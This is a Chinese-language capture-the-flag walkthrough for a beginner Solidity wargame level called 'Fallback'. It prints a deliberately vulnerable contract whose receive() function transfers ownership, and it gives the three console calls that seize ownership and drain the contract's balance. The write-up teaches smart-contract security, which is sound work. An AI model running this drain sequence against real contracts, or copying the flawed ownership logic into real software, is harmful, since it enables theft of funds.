### 第二关 Fallback
### 难度1/5
## 这一关的通关条件有两个，1：成为合约的owner。2、把合约的balance掏空。
## 代码如下：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```
1. 观察合约，成为owner有两种方法。先看第一种方法：
可以看出合约在constructor()中写入了contributions[msg.sender] = 1000 * (1 ether);，就是说需要转入大于owner持有的balance数量才可以成为新的owner，而且contribute()函数规定require(msg.value < 0.001 ether);，所以常规方法不行。
```solidity
    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }
```
2. 第二种方法：观察可以看出还有个receive()函数可以更改owner，这个函数很特殊，没有function标识。
```solidity
    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
```
在Solidity中，fallback函数和receive函数是特殊函数，都是用于处理合约接收到的以太币或未匹配的函数调用。关键区别如下所示，关卡合约里的receive()函数还有两个条件，需要(msg.value > 0 && contributions[msg.sender] > 0)。
| 特性      | receive                | fallback                     |
|-----------|-------------------------|------------------------------|
| 特性      | receive                 | fallback                     |
| 触发条件  | 纯 ETH 转账 (无数据)    | 未匹配函数调用或带数据转账   |
| payable   | 必须                    | 可选                          |
| 参数      | 无                      | 可访问 `msg.data`            |
| 优先级    | 高 (纯转账优先)         | 低 (仅当 `receive` 不适用)   |

## 解题步骤：
1. 首先调用contribute()函数将玩家钱包地址的balance增加。
```javascript
await contract.contribute({value: toWei("0.00001")})
```
2. 直接向合约转账，触发receive()函数。
```javascript
await contract.sendTransaction({value: toWei("0.00001")})
```
3. 调用withdraw()函数把合约的balance掏空。
```javascript
await contract.withdraw()
```
4. 提交通过关卡。
